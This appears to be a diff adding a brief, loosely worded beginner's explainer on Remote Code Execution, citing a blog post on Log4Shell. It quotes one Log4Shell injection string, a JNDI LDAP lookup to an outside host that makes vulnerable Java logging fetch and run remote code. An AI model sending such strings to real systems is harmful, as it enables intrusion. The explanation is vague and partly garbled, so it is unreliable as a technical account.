@@ -1,0 +1,21 @@
+In this article, I will teach you:
+What is RCE?
+
+----------------------------------------
+Abbreviation:
+RCE = Remote Code Execution
+
+----------------------------------------
+Introduction to RCE:
+RCE is a technique that can controll t0 execute code remotely.
+The RCE bug will damage user's severely.
+
+----------------------------------------
+Such as:
+In Java, the string is executed.
+${jndi:ldap://cymetrics.io/test}
+The executable file in the URL website cymetrics.io/test will be executed.
+
+----------------------------------------
+[ref]
+https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/
